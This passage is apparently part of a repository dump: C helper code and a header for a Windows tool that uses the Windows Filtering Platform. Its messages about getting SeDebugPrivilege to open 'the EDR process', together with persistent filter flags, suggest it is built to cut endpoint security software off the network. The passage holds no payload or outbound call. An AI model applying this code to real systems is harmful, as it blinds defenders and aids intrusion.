(GetLastError() == ERROR_NOT_ALL_ASSIGNED) {\r\n        printf(\"[-] Failed to get SeDebugPrivilege. You might not be able to get the process handle of the EDR process.\\n\");\r\n\t\tCloseHandle(hToken);\r\n\t\treturn FALSE;\r\n    }\r\n\r\n\tCloseHandle(hToken);\r\n\treturn TRUE;\r\n}\r\n\r\nvoid CharArrayToWCharArray(const char charArray[], WCHAR wCharArray[], size_t wCharArraySize) {\r\n    int result = MultiByteToWideChar(CP_UTF8, 0, charArray, -1, wCharArray, wCharArraySize);\r\n\r\n    if (result == 0) {\r\n        printf(\"[-] MultiByteToWideChar failed with error code: 0x%x.\\n\", GetLastError());\r\n        wCharArray[0] = L'\\0';\r\n    }\r\n}\r\n\r\nBOOL GetDriveName(PCWSTR filePath, wchar_t* driveName, size_t driveNameSize) {\r\n    if (!filePath) {\r\n        return FALSE;\r\n    }\r\n    const wchar_t *colon = wcschr(filePath, L':');\r\n    if (colon && (colon - filePath + 1) < driveNameSize) {\r\n        wcsncpy(driveName, filePath, colon - filePath + 1);\r\n        driveName[colon - filePath + 1] = L'\\0';\r\n        return TRUE;\r\n    } else {\r\n        return FALSE;\r\n    }\r\n}\r\n\r\nErrorCode ConvertToNtPath(PCWSTR filePath, wchar_t* ntPathBuffer, size_t bufferSize) {\r\n    WCHAR driveName[10];\r\n    WCHAR ntDrivePath[MAX_PATH];\r\n    if (!filePath || !ntPathBuffer) {\r\n        return CUSTOM_NULL_INPUT;\r\n    }\r\n\r\n    if (!GetDriveName(filePath, driveName, sizeof(driveName) / sizeof(WCHAR))) {\r\n        return CUSTOM_DRIVE_NAME_NOT_FOUND;\r\n    }\r\n\r\n    if (QueryDosDeviceW(driveName, ntDrivePath, sizeof(ntDrivePath) / sizeof(WCHAR)) == 0) {\r\n        return CUSTOM_FAILED_TO_GET_DOS_DEVICE_NAME;\r\n    }\r\n\r\n    swprintf(ntPathBuffer, bufferSize, L\"%ls%ls\", ntDrivePath, filePath + wcslen(driveName));\r\n    \r\n    for (size_t i = 0; ntPathBuffer[i] != L'\\0'; ++i) {\r\n        ntPathBuffer[i] = towlower(ntPathBuffer[i]);\r\n    }\r\n    return CUSTOM_SUCCESS;\r\n}\r\n\r\nBOOL FileExists(PCWSTR filePath) {\r\n    if (!filePath) {\r\n        return FALSE;\r\n    }\r\n\r\n    DWORD fileAttrib = GetFileAttributesW(filePath);\r\n    if (fileAttrib == INVALID_FILE_ATTRIBUTES) {\r\n        return FALSE;\r\n    }\r\n\r\n    return TRUE;\r\n}\r\n\r\nErrorCode CustomFwpmGetAppIdFromFileName0(PCWSTR filePath, FWP_BYTE_BLOB** appId) {\r\n    if (!FileExists(filePath)) {\r\n        return CUSTOM_FILE_NOT_FOUND;\r\n    }\r\n\r\n    WCHAR ntPath[MAX_PATH];\r\n    ErrorCode errorCode = ConvertToNtPath(filePath, ntPath, sizeof(ntPath));\r\n    if (errorCode != CUSTOM_SUCCESS) {\r\n        return errorCode;\r\n    }\r\n    *appId = (FWP_BYTE_BLOB*)malloc(sizeof(FWP_BYTE_BLOB));\r\n    if (!*appId) {\r\n        return CUSTOM_MEMORY_ALLOCATION_ERROR;\r\n    }\r\n\r\n    (*appId)->size = wcslen(ntPath) * sizeof(WCHAR) + sizeof(WCHAR);\r\n    \r\n    (*appId)->data = (UINT8*)malloc((*appId)->size);\r\n    if (!(*appId)->data) {\r\n        free(*appId);\r\n        return CUSTOM_MEMORY_ALLOCATION_ERROR;\r\n    }\r\n    memcpy((*appId)->data, ntPath, (*appId)->size);\r\n    return CUSTOM_SUCCESS;\r\n}\r\n\r\nvoid FreeAppId(FWP_BYTE_BLOB* appId) {\r\n    if (appId) {\r\n        if (appId->data) {\r\n            free(appId->data);\r\n        }\r\n        free(appId);\r\n    }\r\n}\r\n\r\n// Get provider GUID by description\r\nBOOL GetProviderGUIDByDescription(PCWSTR providerDescription, GUID* outProviderGUID) {\r\n    DWORD result = 0;\r\n    HANDLE hEngine = NULL;\r\n    HANDLE enumHandle = NULL;\r\n    FWPM_PROVIDER0** providers = NULL;\r\n    UINT32 numProviders = 0;\r\n\r\n    result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_DEFAULT, NULL, NULL, &hEngine);\r\n    if (result != ERROR_SUCCESS) {\r\n        printf(\"[-] FwpmEngineOpen0 failed with error code: 0x%x.\\n\", result);\r\n        return FALSE;\r\n    }\r\n\r\n    result = FwpmProviderCreateEnumHandle0(hEngine, NULL, &enumHandle);\r\n    if (result != ERROR_SUCCESS) {\r\n        printf(\"[-] FwpmProviderCreateEnumHandle0 failed with error code: 0x%x.\\n\", result);\r\n        FwpmEngineClose0(hEngine);\r\n        return FALSE;\r\n    }\r\n\r\n    result = FwpmProviderEnum0(hEngine, enumHandle, 100, &providers, &numProviders);\r\n    if (result != ERROR_SUCCESS) {\r\n        printf(\"[-] FwpmProviderEnum0 failed with error code: 0x%x.\\n\", result);\r\n        FwpmEngineClose0(hEngine);\r\n        return FALSE;\r\n    }\r\n\r\n    BOOL found = FALSE;\r\n    for (UINT32 i = 0; i < numProviders; i++) {\r\n        if (providers[i]->displayData.description != NULL) {\r\n            if (wcscmp(providers[i]->displayData.description, providerDescription) == 0) {\r\n                *outProviderGUID = providers[i]->providerKey;\r\n                found = TRUE;\r\n                break;\r\n            }\r\n        }   \r\n    }\r\n\r\n    if (providers) {\r\n        FwpmFreeMemory0((void**)&providers);\r\n    }\r\n\r\n    FwpmProviderDestroyEnumHandle0(hEngine, enumHandle);\r\n    FwpmEngineClose0(hEngine);\r\n    return found;\r\n}\r\n"
        },
        {
          "name": "utils.h",
          "type": "blob",
          "size": 1.5693359375,
          "content": "#include <windows.h>\r\n#include <initguid.h>\r\n#include <fwpmu.h>\r\n#include <stdio.h>\r\n#include <tlhelp32.h>\r\n\r\n// d78e1e87-8644-4ea5-9437-d809ecefc971\r\nDEFINE_GUID(\r\n   FWPM_CONDITION_ALE_APP_ID,\r\n   0xd78e1e87,\r\n   0x8644,\r\n   0x4ea5,\r\n   0x94, 0x37, 0xd8, 0x09, 0xec, 0xef, 0xc9, 0x71\r\n);\r\n\r\n// c38d57d1-05a7-4c33-904f-7fbceee60e82\r\nDEFINE_GUID(\r\n   FWPM_LAYER_ALE_AUTH_CONNECT_V4,\r\n   0xc38d57d1,\r\n   0x05a7,\r\n   0x4c33,\r\n   0x90, 0x4f, 0x7f, 0xbc, 0xee, 0xe6, 0x0e, 0x82\r\n);\r\n\r\n// 4a72393b-319f-44bc-84c3-ba54dcb3b6b4\r\nDEFINE_GUID(\r\n   FWPM_LAYER_ALE_AUTH_CONNECT_V6,\r\n   0x4a72393b,\r\n   0x319f,\r\n   0x44bc,\r\n   0x84, 0xc3, 0xba, 0x54, 0xdc, 0xb3, 0xb6, 0xb4\r\n);\r\n\r\ntypedef enum ErrorCode {\r\n    CUSTOM_SUCCESS = 0,\r\n    CUSTOM_FILE_NOT_FOUND = 0x1,\r\n    CUSTOM_MEMORY_ALLOCATION_ERROR = 0x2,\r\n    CUSTOM_NULL_INPUT = 0x3,\r\n    CUSTOM_DRIVE_NAME_NOT_FOUND = 0x4,\r\n    CUSTOM_FAILED_TO_GET_DOS_DEVICE_NAME = 0x5,\r\n} ErrorCode;\r\n\r\n#define FWPM_FILTER_FLAG_PERSISTENT (0x00000001)\r\n#define FWPM_PROVIDER_FLAG_PERSISTENT (0x00000001)\r\nBOOL CheckProcessIntegrityLevel();\r\nBOOL EnableSeDebugPrivilege();\r\nvoid CharArrayToWCharArray(const char charArray[], WCHAR wCharArray[], size_t wCharArraySize);\r\nBOOL GetDriveName(PCWSTR fileName, wchar_t* driveName, size_t driveNameSize);\r\nErrorCode ConvertToNtPath(PCWSTR filePath, wchar_t* ntPathBuffer, size_t bufferSize);\r\nBOOL FileExists(PCWSTR filePath);\r\nErrorCode CustomFwpmGetAppIdFromFileName0(PCWSTR filePath, FWP_BYTE_BLOB** appId);\r\nvoid FreeAppId(FWP_BYTE_BLOB* appId);\r\nBOOL GetProviderGUIDByDescription(PCWSTR providerDescription, GUID* outProviderGUID);"
        }
      ]
    }
  ]
}